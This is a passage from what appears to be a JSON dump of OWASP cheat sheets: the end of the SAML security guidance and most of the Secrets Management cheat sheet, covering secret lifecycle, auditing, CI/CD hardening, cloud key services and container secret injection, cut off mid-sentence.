the SAML token is generated and how it is consumed are both important in practice.\r\n\r\n### Identity Provider (IdP) Considerations\r\n\r\n- Validate X.509 Certificate for algorithm compatibility, strength of encryption, export restrictions\r\n- Validate Strong Authentication options for generating the SAML token\r\n- IDP validation (which IDP mints the token)\r\n- Use/Trust Root CAs whenever possible\r\n- Synchronize to a common Internet timesource\r\n- Define levels of assurance for identity verification\r\n- Prefer asymmetric identifiers for identity assertions over personally identifiable information (e.g. SSNs, etc)\r\n- Sign each individual Assertion or the entire Response element\r\n\r\n### Service Provider (SP) Considerations\r\n\r\n- Validating session state for user\r\n- Level of granularity in setting authorization context when consuming SAML token (do you use groups, roles, attributes)\r\n- Ensure each Assertion or the entire Response element is signed\r\n- [Validate Signatures](#validate-signatures)\r\n- Validate if signed by authorized IDP\r\n- Validate IDP certificates for expiration and revocation against CRL/OCSP\r\n- Validate NotBefore and NotOnorAfter\r\n- Validate Recipient attribute\r\n- Define criteria for SAML logout\r\n- Exchange assertions only over secure transports\r\n- Define criteria for session management\r\n- Verify user identities obtained from SAML ticket assertions whenever possible.\r\n\r\n## Input Validation\r\n\r\nJust because SAML is a security protocol does not mean that input validation goes away.\r\n\r\n- Ensure that all SAML providers/consumers do proper [input validation](Input_Validation_Cheat_Sheet.md).\r\n\r\n## Cryptography\r\n\r\nSolutions relying cryptographic algorithms need to follow the latest developments in cryptoanalysis.\r\n\r\n- Ensure all SAML elements in the chain use [strong encryption](Cryptographic_Storage_Cheat_Sheet.md#algorithms)\r\n- Consider deprecating support for [insecure XMLEnc algorithms](https://www.w3.org/TR/xmlenc-core1/#sec-RSA-1_5)\r\n"
    },
    {
      "Secrets_Management_Cheat_Sheet.md": "# Secrets Management Cheat Sheet\r\n\r\n## 1 Introduction\r\n\r\nSecrets are being used everywhere nowadays, especially with the popularity of the DevOps movement. Application Programming Interface (API) keys, database credentials, Identity and Access Management (IAM) permissions, Secure Shell (SSH) keys, certificates, etc. Many organizations have them hardcoded within the source code in plaintext, littered throughout configuration files and configuration management tools.\r\n\r\nThere is a growing need for organizations to centralize the storage, provisioning, auditing, rotation and management of secrets to control access to secrets and prevent them from leaking and compromising the organization. Often, services share the same secrets, which makes identifying the source of compromise or leak challenging.\r\n\r\nThis cheat sheet offers best practices and guidelines to help properly implement secrets management.\r\n\r\n## 2 General Secrets Management\r\n\r\nThe following sections address the main concepts relating to secrets management.\r\n\r\n### 2.1 High Availability\r\n\r\nIt is vital to select a technology that is robust enough to service traffic reliably:\r\n\r\n- Users (e.g. SSH keys, root account passwords). In an incident response scenario, users expect to be provisioned with credentials rapidly, so they can recover services that have gone offline. Having to wait for credentials could impact the responsiveness of the operations team.\r\n- Applications (e.g. database credentials and API keys). If the service is not performant, it could degrade the availability of dependent applications or increase application startup times.\r\n\r\nSuch a service could receive a considerable volume of requests within a large organization.\r\n\r\n### 2.2 Centralize and Standardize\r\n\r\nSecrets used by your DevOps teams for your applications might be consumed differently than secrets stored by your marketeers or your SRE team. You often find poorly maintained secrets where the needs of secret consumers or producers mismatch. Therefore, you must standardize and centralize the secrets management solution with care. Standardizing and centralizing can mean that you use multiple secret management solutions. For instance: your cloud-native development teams choose to use the solution provided by the cloud provider, while your private cloud uses a third-party solution, and everybody has an account for a selected password manager.\r\nBy making sure that the teams standardize the interaction with these different solutions, they remain maintainable and usable in the event of an incident.\r\nEven when a company centralizes its secrets management to just one solution, you will often have to secure the master secret of that secrets management solution in a secondary secrets management solution. For instance, you can use a cloud provider's facilities to store secrets, but that cloud provider's root/management credentials need to be stored somewhere else.\r\n\r\nStandardization should include Secrets life cycle management, Authentication, Authorization, and Accounting of the secrets management solution, and life cycle management. Note that it should be immediately apparent to an organization what a secret is used for and where to find it. The more Secrets management solutions you use, the more documentation you need.\r\n\r\n### 2.3 Access Control\r\n\r\nWhen users can read the secret in a secret management system and/or update it, it means that the secret can now leak through that user and the system he used to touch the secret.\r\nTherefore, engineers should not have access to all secrets in the secrets management system, and the Least Privilege principle should be applied. The secret management system needs to provide the ability to configure fine granular access controls on each object and component to accomplish the Least Privilege principle.\r\n\r\n### 2.4 Automate Secrets Management\r\n\r\nManual maintenance does not only increase the risk of leakage; it introduces the risk of human errors while maintaining the secret. Furthermore, it can become wasteful.\r\nTherefore, it is better to limit or remove the human interaction with the actual secrets. You can restrict human interaction in multiple ways:\r\n\r\n- **Secrets pipeline:** Having a secrets pipeline which does large parts of the secret management (E.g. creation, rotation, etc.)\r\n- **Using dynamic secrets:** When an application starts it could request it's database credentials, which when dynamically generated will be provided with new credentials for that session. Dynamic secrets should be used where possible to reduce the surface area of credential re-use. Should the application's database credentials be stolen, upon reboot they would be expired.\r\n- **Automated rotation of static secrets:** Key rotation is a challenging process when implemented manually, and can lead to mistakes. It is therefore better to automate the rotation of keys or at least ensure that the process is sufficiently supported by IT.\r\n\r\nRotating certain keys, such as encryption keys, might trigger full or partial data re-encryption. Different strategies for rotating keys exist:\r\n\r\n- Gradual rotation\r\n- Introducing new keys for Write operations\r\n- Leaving old keys for Read operations\r\n- Rapid rotation\r\n- Scheduled rotation\r\n- and more...\r\n\r\n### 2.5 Handling Secrets in Memory\r\n\r\nAn additional level of security can be achieved by minimizing the time window\r\nwhere a secret is in memory and limiting the access to its memory space.\r\n\r\nDepending on your particular circumstances, this can be difficult implement in a\r\nmanner that ensures memory security. Since determining whether it is beneficial\r\nto take this an additional step, you are encouraged first to develop a threat model\r\nin order to clearly surface your implicit assumptions about both your deployment environment as well\r\nas understanding the capability of your adversaries.\r\n\r\nOften attempting to protect protect secrets in memory will be considered overkill\r\nbecause as you evaluate a threat model the potential threat\r\nactors that you consider either do not have the capabilities to carry out such attacks\r\nor the cost of defense far exceeds the likely impact of a compromise arising from\r\nexposing secrets in memory. However, it should be kept in mind while developing an\r\nappropriate threat model, that if an attacker already has access to the memory of\r\nthe process handling the secret, by that time a security breach may have already\r\noccurred. Furthermore, it should be recognized that with the advent of attacks like\r\n[Rowhammer](https://arxiv.org/pdf/2211.07613.pdf), or\r\n[Meltdown and Spectre](https://meltdownattack.com/), it is important\r\nto understand that the operating system alone is not sufficient to protect your process\r\nmemory from these types of attacks. This becomes especially important when your\r\napplication is deployed to the cloud. The only fullproof approach to protecting memory\r\nagainst these and similar attacks to fully physically isolate your process memory from all other\r\nuntrusted processes.\r\n\r\nNevertheless, in highly sensitive environments, protecting secrets in memory can\r\nbe a valuable additional layer of security. For example, in scenarios where an\r\nadvanced attacker can cause a system to crash and gain access to a memory dump,\r\nthey may be able to extract secrets from it. Therefore, carefully safeguarding\r\nsecrets in memory is recommended for untrusted environments or situations where\r\ntight security is of utmost importance.\r\n\r\nFurthermore, in lower level languages like C/C++, it is relatively easy to protect\r\nsecrets in memory. Thus, it may be worthwhile to implement this practice even if\r\nthe risk of an attacker gaining access to the memory is low. On the other hand, for\r\nprogramming languages that rely on garbarge collection, securing secrets in memory\r\ngenerally is much more difficult.\r\n\r\n- **Structures and Classes:** In .NET and Java, do not use immutable structures\r\n    such as Strings to store secrets, since it is impossible to force them to\r\n    be garbage collected. Instead use primitive types such as byte arrays or\r\n    char arrays, where the memory can be directly overwritten. You can also\r\n    use Java's\r\n    [GuardedString](https://docs.oracle.com/html/E28160_01/org/identityconnectors/common/security/GuardedString.html)\r\n    or .NET's\r\n    [SecureString](https://learn.microsoft.com/en-us/dotnet/api/system.security.securestring#string-versus-securestring)\r\n    which are designed to solve precisely this problem.\r\n\r\n- **Zeroing Memory:** After a secret has been used, the memory it occupied\r\n  should be zeroed out to prevent it from lingering in memory where it could\r\n  potentially be accessed.\r\n    - If using Java's GuardedString, call the `dispose()` method.\r\n    - If using .NET's SecureString, call the `Dispose()` method.\r\n\r\n- **Memory Encryption:** In some cases, it may be possible to use hardware or\r\n  operating system features to encrypt the entire memory space of the process\r\n  handling the secret. This can provide an additional layer of security. For\r\n  example, GuardedString in Java encrypts the values in memory, and SecureString\r\n  in .NET does so on Windows.\r\n\r\nRemember, the goal is to minimize the time window where the secret is in\r\nplaintext in memory as much as possible.\r\n\r\nFor more detailed information, see\r\n[Testing Memory for Sensitive Data](https://mas.owasp.org/MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0011)\r\nfrom the OWASP MAS project.\r\n\r\n### 2.6 Auditing\r\n\r\nAuditing is an essential part of secrets management due to the nature of the application. You must implement auditing securely to be resilient against attempts to tamper with or delete the audit logs. At a minimum, you should audit the following:\r\n\r\n- Who requested a secret and for what system and role.\r\n- Whether the secret request was approved or rejected.\r\n- When the secret was used and by whom/what.\r\n- When the secret has expired.\r\n- Whether there were any attempts to re-use expired secrets.\r\n- If there have been any authentication or authorization errors.\r\n- When the secret was updated and by whom/what.\r\n- Any administrative actions and possible user activity on the underlying supporting infrastructure stack.\r\n\r\nIt is essential that all auditing has correct timestamps. Therefore, the secret management solution should have proper time sync protocols set up at its supporting infrastructure. You should monitor the stack on which the solution runs for possible clock-skew and manual time adjustments.\r\n\r\n### 2.7 Secret Lifecycle\r\n\r\nSecrets follow a lifecycle. The stages of the lifecycle are as follows:\r\n\r\n- Creation\r\n- Rotation\r\n- Revocation\r\n- Expiration\r\n\r\n#### 2.7.1 Creation\r\n\r\nNew secrets must be securely generated and cryptographically robust enough for their purpose. Secrets must have the minimum privileges assigned to them to enable their required use/role.\r\n\r\nYou should transmit credentials securely, such that ideally, you don't send the password along with the username when requesting user accounts. Instead, you should send the password via a secure channel (e.g. mutually authenticated connection) or a side-channel such as push notification, SMS, email. Refer to the [Multi-Factor Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet) to learn about the pros and cons of each channel.\r\n\r\nApplications may not benefit from having multiple communication channels, so you must provision credentials securely.\r\n\r\nSee [the Open CRE project on secrets lookup](https://www.opencre.org/cre/223-780) for more technical recommendations on secret creation.\r\n\r\n#### 2.7.2 Rotation\r\n\r\nYou should regularly rotate secrets so that any stolen credentials will only work for a short time. Regular rotation will also reduce the tendency for users to fall back to bad habits such as re-using credentials.\r\n\r\nDepending on a secret's function and what it protects, the lifetime could be from minutes (think end-to-end encrypted chats with perfect forward secrecy) to years (consider hardware secrets).\r\n\r\nUser credentials are excluded from regular rotating. These should only be rotated if there is suspicion or evidence that they have been compromised, according to [NIST recommendations](https://pages.nist.gov/800-63-FAQ/#q-b05).\r\n\r\n#### 2.7.3 Revocation\r\n\r\nWhen secrets are no longer required or potentially compromised, you must securely revoke them to restrict access. With (TLS) certificates, this also involves certificate revocation.\r\n\r\n#### 2.7.4 Expiration\r\n\r\nYou should create secrets to expire after a defined time where possible. This expiration can either be active expiration by the secret consuming system, or an expiration date set at the secrets management system forcing supporting processes to be triggered, resulting in a secret rotation.\r\nYou should apply policies through the secrets management solution to ensure credentials are only made available for a limited time appropriate for the type of credentials. Applications should verify that the secret is still active before trusting it.\r\n\r\n### 2.8 Transport Layer Security (TLS) Everywhere\r\n\r\nNever transmit secrets via plaintext. In this day and age, there is no excuse given the ubiquitous adoption of TLS.\r\n\r\nFurthermore, you can effectively use secrets management solutions to provision TLS certificates.\r\n\r\n### 2.9 Downtime, Break-glass, Backup and Restore\r\n\r\nConsider the possibility that a secrets management service becomes unavailable for various reasons, such as scheduled downtime for maintenance. It could be impossible to retrieve the credentials required to restore the service if you did not previously acquire them. Thus, choose maintenance windows carefully based on earlier metrics and audit logs.\r\n\r\nNext, the backup and restore procedures of the system should be regularly tested and audited for their security. A few requirements regarding backup & restore. Ensure that:\r\n\r\n- An automated backup procedure is in place and executed periodically; base the frequency of the backups and snapshots on the number of secrets and their lifecycle.\r\n- Frequently test restore procedures to guarantee that the backups are intact.\r\n- Encrypt backups and put them on secure storage with reduced access rights. Monitor the backup location for (unauthorized) access and administrative actions.\r\n\r\nLastly, you should implement emergency (\"break-glass\") processes to restore the service if the system becomes unavailable for reasons other than regular maintenance. Therefore, emergency break-glass credentials should be regularly backed up securely in a secondary secrets management system and tested routinely to verify they work.\r\n\r\n### 2.10 Policies\r\n\r\nConsistently enforce policies defining the minimum complexity requirements of passwords and approved encryption algorithms at an organization-wide level. Using a centralized secrets management solution can help companies implement these policies.\r\n\r\nNext, having an organization-wide secrets management policy can help enforce applying the best practices defined in this cheat sheet.\r\n\r\n### 2.11 Metadata: prepare to move the secret\r\n\r\nA secret management solution should provide the capability to store at least the following metadata about a secret:\r\n\r\n- When it was created/consumed/archived/rotated/deleted\r\n- Who created/consumed/archived/rotated/deleted it (e.g. both the actual producer, and the engineer using the production method)\r\n- What created/consumed/archived/rotated/deleted it\r\n- Who to contact when having trouble with the secret or having questions about it\r\n- For what the secret is used (E.g. designated intended consumers and purpose of the secret)\r\n- What type of secret it is (E.g. AES Key, HMAC key, RSA private key)\r\n- When you need to rotate it, if done manually\r\n\r\nNote: if you don't store metadata about the secret nor prepare to move, you will increase the probability of vendor lock-in.\r\n\r\n## 3 Continuous Integration (CI) and Continuous Deployment (CD)\r\n\r\nBuilding, testing and deploying changes generally requires access to many systems. Continuous Integration (CI) and Continuous Deployment (CD) tools typically store secrets to provide configuration to the application or during deployment. Alternatively, they interact heavily with the secrets management system. Various best practices can help smooth out secret management in CI/CD; we will deal with some of them in this section.\r\n\r\n### 3.1 Hardening your CI/CD pipeline\r\n\r\nCI/CD tooling consumes (high-privilege) credentials regularly. Ensure that the pipeline cannot be easily hacked or misused by employees. Here are a few guidelines which can help you:\r\n\r\n- Treat your CI/CD tooling as a production environment: harden it, patch it and harden the underlying infrastructure and services.\r\n- Have Security Event Monitoring in place.\r\n- Implement least-privilege access: developers do not need to be able to administer projects. Instead, they only need to be able to execute required functions, such as setting up pipelines, running them, and working with code. Administrative tasks can quickly be done using configuration-as-code in a separate repository used by the CI/CD system to update its configuration. There is no need for privileged roles that might have access to secrets.\r\n- Make sure that pipeline output does not leak secrets, and you can't listen in on production pipelines with debugging tools.\r\n- Make sure you cannot exec into any runners and workers for a CI/CD system.\r\n- Have proper authentication, authorization and accounting in place.\r\n- Ensure only an approved process can create pipelines, including MR/PR steps to ensure that a created pipeline is security-reviewed.\r\n\r\n### 3.2 Where should a secret be?\r\n\r\nThere are various places where you can store a secret to execute CI/CD actions:\r\n\r\n- As part of your CI/CD tooling: you can store a secret in [GitLab](https://docs.gitlab.com/charts/installation/secrets.html)/[GitHub](https://docs.github.com/en/actions/security-guides/encrypted-secrets)/[jenkins](https://www.jenkins.io/doc/developer/security/secrets/). This is not the same as committing it to code.\r\n- As part of your secrets-management system: you can store a secret in a secrets management system, such as facilities provided by a cloud provider ([AWS Secret Manager](https://aws.amazon.com/secrets-manager/), [Azure Key Vault](https://azure.microsoft.com/nl-nl/services/key-vault/), [Google Secret Manager](https://cloud.google.com/secret-manager)), or other third-party facilities ([Hashicorp Vault](https://www.vaultproject.io/), [Conjur](https://www.conjur.org/), [Keeper](https://www.keepersecurity.com/), [Confidant](https://lyft.github.io/confidant/)). In this case, the CI/CD pipeline tooling requires credentials to connect to these secret management systems to have secrets in place. See [Cloud Providers](#4-cloud-providers) for more details on using a cloud provider's secret management system.\r\n\r\nAnother alternative here is using the CI/CD pipeline to leverage the Encryption as a Service from the secrets management systems to do the encryption of a secret. The CI/CD tooling can then commit the encrypted secret to git, which can be fetched by the consuming service on deployment and decrypted again. See section 3.6 for more details.\r\n\r\nNote: not all secrets must be at the CI/CD pipeline to get to the actual deployment. Instead, make sure that the deployed services take care of part of their secrets management at their own lifecycle (E.g. deployment, runtime and destruction).\r\n\r\n#### 3.2.1 As part of your CI/CD tooling\r\n\r\nWhen secrets are part of your CI/CD tooling, it means that these secrets are exposed to your CI/CD jobs. CI/CD tooling can comprise, e.g. GitHub secrets, GitLab repository secrets, ENV Vars/Var Groups in Microsoft Azure DevOps, Kubernetes Secrets, etc.\r\nThese secrets are often configurable/viewable by people who have the authorization to do so (e.g. a maintainer in GitHub, a project owner in GitLab, an admin in Jenkins, etc.), which together lines up for the following best practices:\r\n\r\n- No \"big secret\": ensure that secrets in your CI/CD tooling that are not long-term, don't have a wide blast radius, and don't have a high value. Also, limit shared secrets (e.g. never have one password for all administrative users).\r\n- As is / To be: have a clear overview of which users can view or alter the secrets. Often, maintainers of a GitLab/GitHub project can see or otherwise extract its secrets.\r\n- Reduce the number of people that can perform administrative tasks on the project to limit exposure.\r\n- Log & Alert: Assemble all the logs from the CI/CD tooling and have rules in place to detect secret extraction, or misuse, whether through accessing them through a web interface or dumping them while double base64 encoding or encrypting them with OpenSSL.\r\n- Rotation: Regularly rotate secrets.\r\n- Forking should not leak: Validate that a fork of the repository or copy of the job definition does not copy the secret.\r\n- Document: Make sure you document which secrets you store as part of your CI/CD tooling and why so that you can migrate these easily when required.\r\n\r\n#### 3.2.2 Storing it in a secrets management system\r\n\r\nNaturally, you can store secrets in a designated secrets management solution. For example, you can use a solution offered by your (cloud) infrastructure provider, such as [AWS Secrets Manager](https://aws.amazon.com/secrets-manager/), [Google Secrets Manager](https://cloud.google.com/secret-manager), or [Azure KeyVault](https://azure.microsoft.com/nl-nl/services/key-vault/). You can find more information about these in [section 4](#4-cloud-providers) of this cheat sheet. Another option is a dedicated secrets management system, such as [Hashicorp Vault](https://www.vaultproject.io/), [Keeper](https://www.keepersecurity.com/), [Confidant](https://lyft.github.io/confidant/), [Conjur](https://www.conjur.org/).\r\nHere are a few do's and don'ts for the CI/CD interaction with these systems. Make sure that the following is taken care of:\r\n\r\n- Rotation/Temporality: credentials used by the CI/CD tooling to authenticate against the secret management system are rotated frequently and expire after a job completes.\r\n- Scope of authorization: scope credentials used by the CI/CD tooling (e.g. roles, users, etc.), only authorize those secrets and services of the secret management system required for the CI/CD tooling to execute its job.\r\n- Attribution of the caller: credentials used by the CI/CD tooling still hold attribution of the one calling the secrets management solution. Ensure you can attribute any calls made by the CI/CD tooling to a person or service that requested the actions of the CI/CD tooling. If this is not possible through the default configuration of the secrets manager, make sure that you have a correlation setup in terms of request parameters.\r\n- All of the above: Still follow those do's and don'ts listed in section 3.2.1: log & alert, take care of forking, etc.\r\n- Backup: back up secrets to product-critical operations in separate storage (e.g. cold storage), especially encryption keys.\r\n\r\n#### 3.2.3 Not touched by CI/CD at all\r\n\r\nSecrets do not necessarily need to be brought to a consumer of the secret by a CI/CD pipeline. It is even better when the consumer of the secret retrieves the secret. In that case, the CI/CD pipeline still needs to instruct the orchestrating system (e.g. [Kubernetes](https://kubernetes.io/)) that it needs to schedule a specific service with a given service account with which the consumer can then retrieve the required secret. The CI/CD tooling then still has credentials for the orchestrating platform but no longer has access to the secrets themselves. The do's and don'ts regarding these credentials types are similar to those described in section 3.2.2.\r\n\r\n### 3.3 Authentication and Authorization of CI/CD tooling\r\n\r\nCI/CD tooling should have designated service accounts, which can only operate in the scope of the required secrets or orchestration of the consumers of a secret. Additionally, a CI/CD pipeline run should be easily attributable to the one who has defined the job or triggered it to detect who has tried to exfiltrate secrets or manipulate them. When you use certificate-based auth, the caller of the pipeline identity should be part of the certificate. If you use a token to authenticate towards the mentioned systems, make sure you set the principal requesting these actions (e.g. the user or the job creator).\r\n\r\nVerify on a periodical basis whether this is (still) the case for your system so that you can do logging, attribution, and security alerting on suspicious actions effectively.\r\n\r\n### 3.4 Logging and Accounting\r\n\r\nAttackers can use CI/CD tooling to extract secrets. They could, for example, use administrative interfaces or job creation which exfiltrates the secret using encryption or double base64 encoding. Therefore, you should log every action in a CI/CD tool. You should define security alerting rules at every non-standard manipulation of the pipeline tool and its administrative interface to monitor secret usage.\r\nLogs should be queryable for at least 90 days and stored for a more extended period in cold storage. It might take security teams time to understand how attackers can exfiltrate or manipulate a secret using CI/CD tooling.\r\n\r\n### 3.5 Rotation vs Dynamic Creation\r\n\r\nYou can leverage CI/CD tooling to rotate secrets or instruct other components to do the rotation of the secret. For instance, the CI/CD tool can request a secrets management system or another application to rotate the secret. Alternatively, the CI/CD tool or another component could set up a dynamic secret: a secret required for a consumer to use for as long as it lives. The secret is invalidated when the consumer no longer lives. This procedure reduces possible leakage of a secret and allows for easy detection of misuse. If an attacker uses secret from anywhere other than the consumer's IP, you can easily detect it.\r\n\r\n### 3.6 Pipeline Created Secrets\r\n\r\nYou can use pipeline tooling to generate secrets and either offer them directly to the service deployed by the tooling or provide the secret to a secrets management solution. Alternatively, the secret can be stored encrypted in git so that the secret and its metadata is as close to the developer's daily place of work as possible. A git-stored secret does require that developers cannot decrypt the secrets themselves and that every consumer of a secret has its encrypted variant of the secret. For instance: the secret should then be different per DTAP environment and be encrypted with another key. For each environment, only the designated consumer in that environment should be able to decrypt the specific secret. A secret does not leak cross-environment and can still be easily stored next to the code.\r\nConsumers of a secret could now decrypt the secret using a sidecar, as described in section 5.2. Instead of retrieving the secrets, the consumer would leverage the sidecar to decrypt the secret.\r\n\r\nWhen a pipeline creates a secret by itself, ensure that the scripts or binaries involved adhere to best practices for secret generation. Best practices include secure-randomness, proper length of secret creation, etc. and that the secret is created based on well-defined metadata stored somewhere in git or somewhere else.\r\n\r\n## 4 Cloud Providers\r\n\r\nFor cloud providers, there are at least four essential topics to touch upon:\r\n\r\n- Designated secret storage/management solutions. Which service(s) do you use?\r\n- Envelope & client-side encryption\r\n- Identity and access management: decreasing the blast radius\r\n- API quotas or service limits\r\n\r\n### 4.1 Services to Use\r\n\r\nIt is best to use a designated secret management solution in any environment. Most cloud providers have at least one service that offers secret management. Of course, it's also possible to run a different secret management solution (e.g. HashiCorp Vault or Conjur) on compute resources within the cloud. We'll consider cloud provider service offerings in this section.\r\n\r\nSometimes it's possible to automatically rotate your secret, either via a service provided by your cloud provider or a (custom-built) function. Generally, you should prefer the cloud provider's solution since the barrier of entry and risk of misconfiguration are lower. If you use a custom solution, ensure the function's role to do its rotation can only be assumed by said function.\r\n\r\n#### 4.1.1 AWS\r\n\r\nFor AWS, the recommended solution is [AWS secret manager](https://docs.aws.amazon.com/secretsmanager/latest/userguide/intro.html).\r\n\r\nPermissions are granted at the secret level. Check out the [Secrets Manager best practices](https://docs.aws.amazon.com/secretsmanager/latest/userguide/best-practices.html).\r\n\r\nIt is also possible to use the [Systems Manager Parameter store](https://docs.aws.amazon.com/systems-manager/latest/userguide/systems-manager-parameter-store.html), which is cheaper, but that has a few downsides:\r\n\r\n- you'll need to make sure you've specified encryption yourself (secrets manager does that by default)\r\n- it offers fewer auto-rotation capabilities (you will likely need to build a custom function)\r\n- it doesn't support cross-account access\r\n- it doesn't support cross-region replication\r\n- there are fewer [security hub controls](https://docs.aws.amazon.com/securityhub/latest/userguide/securityhub-standards-fsbp-controls.html) available\r\n\r\n##### 4.1.1.1 AWS Nitro Enclaves\r\n\r\nWith [AWS Nitro Enclaves](https://aws.amazon.com/ec2/nitro/nitro-enclaves/), you can create trusted execution environments. Thus, no human-based access is possible once the application is running. Additionally, enclaves do not have any permanent storage attached to them. Therefore, secrets and other sensitive data stored on the nitro enclaves have an additional layer of security.\r\n\r\n##### 4.1.1.2 AWS CloudHSM\r\n\r\nFor secrets being used in highly confidential applications, it may be needed to have more control over the encryption and storage of these keys. AWS offers [CloudHSM](https://aws.amazon.com/cloudhsm/), which lets you bring your own key (BYOK) for AWS services. Thus, you will have more control over keys' creation, lifecycle, and durability. CloudHSM allows automatic scaling and backup of your data. The cloud service provider, Amazon, will not have any access to the key material stored in Azure Dedicated HSM.\r\n\r\n#### 4.1.2 GCP\r\n\r\nFor GCP, the recommended service is [Secret Manager](https://cloud.google.com/secret-manager/docs).\r\n\r\nPermissions are granted at the secret level.\r\n\r\nCheck out the [Secret Manager best practices](https://cloud.google.com/secret-manager/docs/best-practices).\r\n\r\n##### 4.1.2.1 Google Cloud Confidential Computing\r\n\r\n[GCP Confidential Computing](https://cloud.google.com/confidential-computing) allows encryption of data during runtime. Thus, application code and data are kept secret, encrypted, and cannot be accessed by humans or tools.\r\n\r\n#### 4.1.3 Azure\r\n\r\nFor Azure, the recommended service is [Key Vault](https://docs.microsoft.com/en-us/azure/key-vault/).\r\n\r\nContrary to other clouds, permissions are granted at the _**Key Vault**_ level. This means secrets for separate workloads and separate sensitivity levels should be in separated Key Vaults accordingly.\r\n\r\nCheck out the [Key Vault best practices](https://docs.microsoft.com/en-us/azure/key-vault/general/best-practices).\r\n\r\n##### 4.1.3.1 Azure Confidential Computing\r\n\r\nWith [Azure Confidential Computing](https://azure.microsoft.com/en-us/solutions/confidential-compute/#overview), you can create trusted execution environments. Thus, every application will be executed in an encrypted enclave that protects the data and code consumed by the application is protected end-to-end. Furthermore, any application running inside enclaves is not accessible by any tool or human.\r\n\r\n##### 4.1.3.2 Azure Dedicated HSM\r\n\r\nFor secrets being used in Azure environments and requiring special security considerations, Azure offers [Azure Dedicated HSM](https://azure.microsoft.com/en-us/services/azure-dedicated-hsm/). This allows you more control over the secrets stored on it, including enhanced administrative and cryptographic control. The cloud service provider, Microsoft, will not have any access to the key material stored in Azure Dedicated HSM.\r\n\r\n#### 4.1.4 Other clouds, Multi-cloud, and Cloud agnostic\r\n\r\nIf you're using multiple cloud providers, you should consider using a cloud agnostic secret management solution. This will allow you to use the same secret management solution across all your cloud providers (and possibly also on-premises). Another advantage is that this avoids vendor lock-in with a specific cloud provider, as the solution can be used on any cloud provider.\r\n\r\nThere are open source and commercial solutions available. Some examples are:\r\n\r\n- [CyberArk Conjur](https://www.conjur.org/)\r\n- [HashiCorp Vault](https://www.vaultproject.io/)\r\n\r\n### 4.2 Envelope & client-side encryption\r\n\r\nThis section will describe how a secret is encrypted and how you can manage the keys for that encryption in the cloud.\r\n\r\n#### 4.2.1 Client-side encryption versus server-side encryption\r\n\r\nServer-side encryption of secrets ensures that the cloud provider takes care of the encryption of the secret in storage. The secret is then safeguarded against compromise while at rest. Encryption at rest often does not require additional work other than selecting the key to encrypt it with (See section 4.2.2). However: when you submit the secret to another service, it will no longer be encrypted. It is decrypted before sharing with the intended service or human user.\r\n\r\nClient-side encryption of secrets ensures that the secret remains encrypted until you actively decrypt it. This means it is only decrypted when it arrives at the consumer. You need to have a proper crypto system to cater for this. Think about mechanisms such as PGP using a safe configuration and other more scalable and relatively easy to use systems. Client-side encryption can provide an end-to-end encryption of the secret: from producer till consumer.\r\n\r\n#### 4.2.2 Bring Your Own Key versus Cloud Provider Key\r\n\r\nWhen you encrypt a secret at rest, the question is: which key do you want to use? The less trust you have in the cloud provider, the more you will want to manage yourself.\r\n\r\nOften, you can either encrypt a secret with a key managed at the secrets management service or use a key management solution from the cloud provider to encrypt the secret. The key offered through the key management solution of the cloud provider can be either managed by the cloud provider or by yourself. Industry standards call the latter \"bring your own key\" (BYOK). You can either directly import or generate this key at the key management solution or using cloud HSM supported by the cloud provider.\r\nYou can then either use your key or the customer master key from the provider to encrypt the data key of the secrets management solution. The data key, in turn, encrypts the secret. By managing the CMK, you have control over the data key at the secrets management solution.\r\n\r\nWhile importing your own key material can generally be done with all providers ([AWS](https://docs.aws.amazon.com/kms/latest/developerguide/importing-keys.html), [Azure](https://docs.microsoft.com/en-us/azure/key-vault/keys/byok-specification), [GCP](https://cloud.google.com/kms/docs/key-import)), unless you know what you are doing and your threat model and policy require this, this is not a recommended solution due to its complexity and difficulty of use.\r\n\r\n### 4.3 Identity and Access Management (IAM)\r\n\r\nIAM applies to both on-premise and cloud setups: to effectively manage secrets, you need to set up suitable access policies and roles. Setting this up goes beyond policies regarding secrets; it should include hardening the full IAM setup, as it could otherwise allow for privilege escalation attacks. Ensure you never allow open \"pass role\" privileges or unrestricted IAM creation privileges, as these can use or create credentials that have access to the secrets. Next, make sure you tightly control what can impersonate a service account: are your machines' roles accessible by an attacker exploiting your server? Can service roles from the data-pipeline tooling access the secrets easily? Ensure you include IAM for every cloud component in your threat model (e.g. ask yourself: how can you do elevation of privileges with this component?). See [this blog entry](https://xebia.com/ten-pitfalls-you-should-look-out-for-in-aws-iam/) for multiple do's and don'ts with examples.\r\n\r\nLeverage the temporality of the IAM principals effectively: e.g. ensure that only specific roles and service accounts that require it can access the secrets. Monitor these accounts so that you can tell who or what used them to access the secrets.\r\n\r\nNext, make sure that you scope access to your secrets: one should not be simply allowed to access all secrets. In GCP and AWS, you can create fine-grained access policies to ensure that a principal cannot access all secrets at once. In Azure, having access to the key vault means having access to all secrets in that key vault. It is, thus, essential to have separate key vaults when working on Azure to segregate access.\r\n\r\n### 4.4 API limits\r\n\r\nCloud services can generally provide a limited amount of API calls over a given period. You could potentially (D)DoS yourself when you run into these limits. Most of these limits apply per account, project, or subscription, so spread workloads to limit your blast radius accordingly. Additionally, some services may support data key caching, preventing load on the key management service API (see for example [AWS data key caching](https://docs.aws.amazon.com/encryption-sdk/latest/developer-guide/data-key-caching.html)). Some services can leverage built-in data key caching. [S3 is one such example](https://docs.aws.amazon.com/AmazonS3/latest/userguide/bucket-key.html).\r\n\r\n## 5 Containers & Orchestrators\r\n\r\nYou can enrich containers with secrets in multiple ways: build time (not recommended) and during orchestration/deployment.\r\n\r\n### 5.1 Injection of Secrets (file, in-memory)\r\n\r\nThere are three ways to get secrets to an app inside a docker container.\r\n\r\n- Mounted volumes (file): With this method, we keep our secrets within a particular config/secret file and mount that file to our instance as a mounted volume. Ensure that these mounts are mounted in by the orchestrator and never built-in, as this will leak the secret with the container definition. Instead, make sure that the orchestrator mounts in the volume when required.\r\n- Fetch from the secret store (in-memory): A sidecar app/container fetches the secrets it needs directly from a secret manager service without dealing with docker config. This solution allows you to use dynamically constructed secrets without worrying about the secrets being viewable from the file system or from checking the docker container's environment variables.\r\n- Environment variables: We can provide secrets directly as part of the docker container configuration. Note: secrets themselves should never be hardcoded using docker ENV or docker ARG commands, as these can easily leak with the container definitions. See the Docker challenges at [WrongSecrets](https://github.com/OWASP/wrongsecrets) as well. Instead, let an orchestrator overwrite the environment variable with the actual secret and ensure that this is not hardcoded. Additionally, environment variables are generally accessible to all processes and may be included 